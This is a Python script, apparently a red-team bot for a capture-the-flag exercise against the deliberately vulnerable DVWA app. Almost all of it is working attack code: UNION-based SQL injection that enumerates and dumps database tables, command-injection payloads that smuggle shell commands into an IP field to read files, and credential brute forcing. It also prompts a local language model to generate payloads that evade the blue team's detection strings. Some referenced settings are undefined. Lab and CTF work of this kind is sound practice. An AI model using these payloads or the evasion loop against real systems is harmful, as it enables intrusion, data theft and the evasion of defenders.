from openai import OpenAI
import requests
import re
import time

# ============================================
# CONFIGURATION
# ============================================
CTFD_TOKEN = "YOUR_CTFD_TOKEN_HERE"
API_KEY = "YOUR_API_KEY_HERE"
TARGET = "http://YOUR_SERVER_IP:"
CTFD_URL = "http://YOUR_SERVER_IP:"
API_URL = "http://YOUR_SERVER_IP:"

CHALLENGES = {
    "sql_injection": 1,
    "command_injection": 2,
    "brute_force": 3
}
# ============================================

client = OpenAI(base_url=LM_STUDIO_URL, api_key="lm-studio")
session = requests.Session()
captured_flags = set()
MY_IP = None

def get_my_ip():
    """
    Gets our public IP once at startup and caches it.
    We only look it up once so there is no latency
    on every single is_blocked check.
    """
    global MY_IP
    if MY_IP:
        return MY_IP
    try:
        MY_IP = requests.get("https://api.ipify.org", timeout=5).text.strip()
        print(f"[*] My public IP: {MY_IP}")
        return MY_IP
    except:
        print("[-] Could not get public IP")
        return None

def is_blocked():
    """
    Checks the security API blocklist directly.
    Uses cached IP so this is fast — under 100ms.
    Called after every single request so the bot
    stops the moment blue team fires a block.
    """
    try:
        ip = get_my_ip()
        if not ip:
            return False
        r = requests.get(f"{SECURITY_API}/blocklist", timeout=2)
        if r.status_code == 200:
            return ip in r.json().get("blocked", [])
    except:
        pass
    return False

def ask_llm(prompt, system=None):
    if system is None:
        system = """You are an automated red team bot competing in a CTF.
        You are attacking DVWA which is an intentionally vulnerable web app.
        Blue team is watching for these exact strings: union select, or '1'='1', or 1=1
        Use evasion techniques to bypass detection.
        Give ONLY the raw payload. Nothing else."""
    response = client.chat.completions.create(
        model="local-model",
        messages=[
            {"role": "system", "content": system},
            {"role": "user", "content": prompt}
        ]
    )
    return response.choices[0].message.content.strip()

def login_to_dvwa():
    print("[*] Logging into DVWA...")
    r = session.get(f"{TARGET}/login.php")
    token = re.search(r"user_token.*?value='(.*?)'", r.text)
    token = token.group(1) if token else ""
    session.post(f"{TARGET}/login.php", data={
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": token
    })
    print("[+] Logged in successfully")

def set_dvwa_security_low():
    r = session.get(f"{TARGET}/security.php")
    token = re.search(r"user_token.*?value='(.*?)'", r.text)
    token = token.group(1) if token else ""
    session.post(f"{TARGET}/security.php", data={
        "security": "low",
        "seclev_submit": "Submit",
        "user_token": token
    })
    print("[*] Security set to low")

def get_ctfd_nonce():
    r = requests.get(
        f"{CTFD_URL}/challenges",
        headers={"Authorization": f"Token {CTFD_TOKEN}"}
    )
    nonce = re.search(r"'csrfNonce': \"(.*?)\"", r.text)
    return nonce.group(1) if nonce else ""

def submit_flag(flag, challenge_id):
    if flag in captured_flags:
        print(f"[*] Already submitted {flag}")
        return
    print(f"[*] Submitting flag: {flag}")
    nonce = get_ctfd_nonce()
    result = requests.post(
        f"{CTFD_URL}/api/v1/challenges/attempt",
        json={"challenge_id": challenge_id, "submission": flag},
        headers={
            "Authorization": f"Token {CTFD_TOKEN}",
            "Content-Type": "application/json",
            "CSRF-Token": nonce
        }
    )
    if result.status_code == 200:
        data = result.json()
        if data.get("data", {}).get("status") == "correct":
            print(f"[+] FLAG ACCEPTED! Points scored!")
            captured_flags.add(flag)
        else:
            print(f"[-] Flag rejected: {data}")

def extract_flag(text):
    match = re.search(r"FLAG\{[^}]+\}", text)
    return match.group(0) if match else None

def try_request(method, url, **kwargs):
    """
    Wrapper for all HTTP requests.
    Checks blocklist immediately after every request.
    This is what makes the block instant —
    the moment blue team fires we know about it
    on the very next request.
    Returns (response_text, blocked) tuple.
    """
    try:
        if method == "GET":
            r = session.get(url, timeout=5, **kwargs)
        else:
            r = session.post(url, timeout=5, **kwargs)
        text = r.text
    except:
        text = ""

    blocked = is_blocked()
    return text, blocked

# ============================================
# CHALLENGE 1 — SQL INJECTION
# ============================================
def attack_sql_injection():
    print("\n" + "="*50)
    print("[*] CHALLENGE 1: SQL INJECTION")
    print("="*50)

    def try_payload(payload):
        text, blocked = try_request(
            "GET",
            f"{TARGET}/vulnerabilities/sqli/",
            params={"id": payload, "Submit": "Submit"}
        )
        return text, blocked

    def get_response_values(html):
        first_names = re.findall(r'First name:\s*([^<\n]+)', html)
        surnames = re.findall(r'Surname:\s*([^<\n]+)', html)
        return first_names, surnames

    # Phase 1 — Confirm injection
    print("\n[*] Phase 1 — Confirming injection works...")
    result, blocked = try_payload("1' OR '1'='1' -- ")
    if blocked:
        print("[!!!] BLOCKED immediately — blue team is fast")
        return False
    if "First name" not in result:
        result, blocked = try_payload("1 OR 1=1 -- ")
        if blocked or "First name" not in result:
            print("[-] Cannot confirm injection")
            return False
    print("[+] Injection confirmed")

    # Phase 2 — Column count
    print("\n[*] Phase 2 — Discovering column count...")
    num_columns = 0
    for i in range(1, 8):
        nulls = ", ".join(["null"] * i)
        result, blocked = try_payload(f"1' UNION SELECT {nulls} -- ")
        if blocked:
            print("[!!!] BLOCKED during column enumeration")
            return False
        if "First name" in result:
            num_columns = i
            print(f"[+] Column count: {num_columns}")
            break

    if num_columns == 0:
        for i in range(1, 8):
            nulls = ", ".join(["null"] * i)
            result, blocked = try_payload(f"1 UNION SELECT {nulls} -- ")
            if blocked:
                print("[!!!] BLOCKED during column enumeration")
                return False
            if "First name" in result:
                num_columns = i
                print(f"[+] Column count: {num_columns}")
                break

    if num_columns == 0:
        print("[-] Could not determine column count")
        return False

    # Phase 3 — Enumerate tables
    print("\n[*] Phase 3 — Enumerating tables...")
    nulls = ["null"] * num_columns
    nulls[0] = "table_name"
    select_cols = ", ".join(nulls)
    result, blocked = try_payload(
        f"1' UNION SELECT {select_cols} FROM information_schema.tables "
        f"WHERE table_schema=database() -- "
    )
    if blocked:
        print("[!!!] BLOCKED during table enumeration")
        return False
    first_names, surnames = get_response_values(result)
    tables = [v.strip() for v in first_names + surnames if v.strip() and v.strip() != "None"]
    print(f"[+] Tables found: {tables}")

    if not tables:
        print("[-] Could not enumerate tables")
        return False

    # Phase 4 — Enumerate columns
    print("\n[*] Phase 4 — Enumerating columns...")
    all_columns = {}
    for table in tables:
        if is_blocked():
            print("[!!!] BLOCKED during column enumeration")
            return False
        nulls = ["null"] * num_columns
        nulls[0] = "column_name"
        select_cols = ", ".join(nulls)
        result, blocked = try_payload(
            f"1' UNION SELECT {select_cols} FROM information_schema.columns "
            f"WHERE table_name='{table}' -- "
        )
        if blocked:
            print("[!!!] BLOCKED during column enumeration")
            return False
        first_names, surnames = get_response_values(result)
        cols = [v.strip() for v in first_names + surnames if v.strip() and v.strip() != "None"]
        if cols:
            all_columns[table] = cols
            print(f"[+] {table}: {cols}")

    # Phase 5 — Ask LLM
    print("\n[*] Phase 5 — Asking LLM which columns likely contain the flag...")
    if is_blocked():
        print("[!!!] BLOCKED before LLM phase")
        return False

    schema_summary = "\n".join([f"Table {t}: columns {c}" for t, c in all_columns.items()])
    llm_response = ask_llm(f"""
    I am doing SQL injection on a CTF challenge.
    I found these tables and columns in the database:
    {schema_summary}
    The flag format is FLAG{{...}} — it could be anywhere.
    Which table and column combinations should I dump to find it?
    Give me a list of: table_name.column_name pairs to check.
    One per line. Most likely first. Raw list only.
    """)
    print(f"[*] LLM suggests checking:\n{llm_response}")

    # Phase 6 — Dump and search
    print("\n[*] Phase 6 — Dumping data and searching for flag...")
    suggestions = []
    for line in llm_response.strip().split('\n'):
        line = line.strip().strip('-').strip('*').strip()
        if '.' in line:
            parts = line.split('.')
            if len(parts) == 2:
                suggestions.append((parts[0].strip(), parts[1].strip()))

    for table, cols in all_columns.items():
        for col in cols:
            if (table, col) not in suggestions:
                suggestions.append((table, col))

    checked = set()
    for table, col in suggestions:
        if (table, col) in checked:
            continue
        checked.add((table, col))

        if is_blocked():
            print("[!!!] BLOCKED during data dump")
            return False

        nulls = ["null"] * num_columns
        nulls[0] = col
        select_cols = ", ".join(nulls)
        result, blocked = try_payload(f"1' UNION SELECT {select_cols} FROM {table} -- ")

        if col == "avatar" and table == "users":
            first_names, surnames = get_response_values(result)
            print(f"[DEBUG] users.avatar values: {first_names + surnames}")

        if blocked:
            print("[!!!] BLOCKED during data dump")
            return False

        flag = extract_flag(result)
        if flag:
            print(f"[!!!] FLAG FOUND in {table}.{col}: {flag}")
            submit_flag(flag, CHALLENGES["sql_injection"])
            return True

        if num_columns >= 2:
            nulls = ["null"] * num_columns
            nulls[1] = col
            select_cols = ", ".join(nulls)
            result, blocked = try_payload(f"1' UNION SELECT {select_cols} FROM {table} -- ")
            if blocked:
                print("[!!!] BLOCKED during data dump")
                return False
            flag = extract_flag(result)
            if flag:
                print(f"[!!!] FLAG FOUND in {table}.{col}: {flag}")
                submit_flag(flag, CHALLENGES["sql_injection"])
                return True

    print("[-] SQL injection challenge failed")
    return False

# ============================================
# CHALLENGE 2 — COMMAND INJECTION
# ============================================
def attack_command_injection():
    print("\n" + "="*50)
    print("[*] CHALLENGE 2: COMMAND INJECTION")
    print("="*50)

    payloads = [
        "127.0.0.1; cat /var/www/html/hackable/flags/flag2.txt",
        "127.0.0.1 | cat /var/www/html/hackable/flags/flag2.txt",
        "127.0.0.1 && cat /var/www/html/hackable/flags/flag2.txt",
        "127.0.0.1\ncat /var/www/html/hackable/flags/flag2.txt",
        "127.0.0.1 `cat /var/www/html/hackable/flags/flag2.txt`",
        "127.0.0.1 $(cat /var/www/html/hackable/flags/flag2.txt)",
        "127.0.0.1; cat /var/www/html/hackable/flags/flag2.txt #",
        "; cat /var/www/html/hackable/flags/flag2.txt",
        "| cat /var/www/html/hackable/flags/flag2.txt",
    ]

    attempt_history = []

    for payload in payloads:
        if is_blocked():
            print("[!!!] BLOCKED — stopping command injection")
            return False

        print(f"[*] Trying: {payload}")
        text, blocked = try_request(
            "POST",
            f"{TARGET}/vulnerabilities/exec/",
            data={"ip": payload, "Submit": "Submit"}
        )

        if blocked:
            print("[!!!] BLOCKED mid-attack — stopping")
            return False

        flag = extract_flag(text)
        if flag:
            print(f"[!!!] FLAG FOUND: {flag}")
            submit_flag(flag, CHALLENGES["command_injection"])
            return True

        attempt_history.append(payload)

    print("[*] Basic payloads exhausted - asking LLM...")
    for i in range(5):
        if is_blocked():
            print("[!!!] BLOCKED — stopping command injection")
            return False

        payload = ask_llm(f"""
        Attacking DVWA command injection at {TARGET}/vulnerabilities/exec/
        The page takes an IP parameter and pings it.
        Flag is at /var/www/html/hackable/flags/flag2.txt
        Previous payloads that failed: {chr(10).join(attempt_history[-5:])}
        Give ONE raw payload for the ip parameter only.
        """)

        print(f"[*] LLM payload: {payload}")
        text, blocked = try_request(
            "POST",
            f"{TARGET}/vulnerabilities/exec/",
            data={"ip": payload, "Submit": "Submit"}
        )

        if blocked:
            print("[!!!] BLOCKED mid-attack")
            return False

        flag = extract_flag(text)
        if flag:
            print(f"[!!!] FLAG FOUND: {flag}")
            submit_flag(flag, CHALLENGES["command_injection"])
            return True
        attempt_history.append(payload)

    print("[-] Command injection challenge failed")
    return False

# ============================================
# CHALLENGE 3 — BRUTE FORCE
# ============================================
def attack_brute_force():
    print("\n" + "="*50)
    print("[*] CHALLENGE 3: BRUTE FORCE")
    print("="*50)

    usernames = ["admin", "user", "test", "guest", "administrator"]
    passwords = ["password", "123456", "admin", "test", "password123",
                 "letmein", "welcome", "monkey", "dragon", "master",
                 "abc123", "qwerty", "pass", "login", "1234"]

    print(f"[*] Trying {len(usernames) * len(passwords)} credential combinations")

    for username in usernames:
        for password in passwords:
            if is_blocked():
                print("[!!!] BLOCKED — stopping brute force")
                return False

            text, blocked = try_request(
                "GET",
                f"{TARGET}/vulnerabilities/brute/",
                params={"username": username, "password": password, "Login": "Login"}
            )

            if blocked:
                print("[!!!] BLOCKED mid-attack — stopping")
                return False

            if "Welcome to the password protected area" in text:
                print(f"[+] CREDENTIALS FOUND: {username}:{password}")
                flag_text, _ = try_request("GET", f"{TARGET}/hackable/flags/flag3.txt")
                flag = extract_flag(flag_text)
                if flag:
                    print(f"[!!!] FLAG FOUND: {flag}")
                    submit_flag(flag, CHALLENGES["brute_force"])
                    return True

            time.sleep(0.5)

    print("[*] Common credentials exhausted - asking LLM...")
    more_passwords = ask_llm("""
    I am brute forcing a login page. Common passwords failed.
    Give me 10 more passwords to try, one per line, no numbering.
    """)

    for password in more_passwords.strip().split('\n')[:10]:
        password = password.strip()
        if not password:
            continue
        if is_blocked():
            print("[!!!] BLOCKED — stopping brute force")
            return False

        text, blocked = try_request(
            "GET",
            f"{TARGET}/vulnerabilities/brute/",
            params={"username": "admin", "password": password, "Login": "Login"}
        )

        if blocked:
            print("[!!!] BLOCKED mid-attack")
            return False

        if "Welcome to the password protected area" in text:
            flag_text, _ = try_request("GET", f"{TARGET}/hackable/flags/flag3.txt")
            flag = extract_flag(flag_text)
            if flag:
                print(f"[!!!] FLAG FOUND: {flag}")
                submit_flag(flag, CHALLENGES["brute_force"])
                return True
        time.sleep(0.5)

    print("[-] Brute force challenge failed")
    return False

# ============================================
# MAIN ATTACK LOOP
# ============================================
def print_score(results):
    print("\n" + "="*50)
    print("RED TEAM FINAL SCORE")
    print("="*50)
    captured = sum(1 for v in results.values() if v)
    for challenge, success in results.items():
        status = "CAPTURED" if success else "FAILED/BLOCKED"
        print(f"  {challenge}: {status}")
    print(f"\nFlags captured: {captured}/3")
    print(f"Scoreboard: {CTFD_URL}/scoreboard")
    print("="*50)

def attack_all():
    # Get our IP once at startup
    get_my_ip()

    login_to_dvwa()
    set_dvwa_security_low()

    results = {
        "sql_injection": False,
        "command_injection": False,
        "brute_force": False
    }

    results["sql_injection"] = attack_sql_injection()

    if is_blocked():
        print("\n[!!!] IP BLOCKED — blue team wins this round")
        print_score(results)
        return

    print("\n[*] Moving to command injection in 5 seconds...")
    time.sleep(5)
    results["command_injection"] = attack_command_injection()

    if is_blocked():
        print("\n[!!!] IP BLOCKED — blue team stopped command injection")
        print_score(results)
        return

    print("\n[*] Moving to brute force in 5 seconds...")
    time.sleep(5)
    results["brute_force"] = attack_brute_force()

    print_score(results)

if __name__ == "__main__":
    print("=== RED TEAM BOT STARTING ===")
    print("[*] Attacking all three challenges")
    print("[*] SQL Injection → Command Injection → Brute Force")
    attack_all()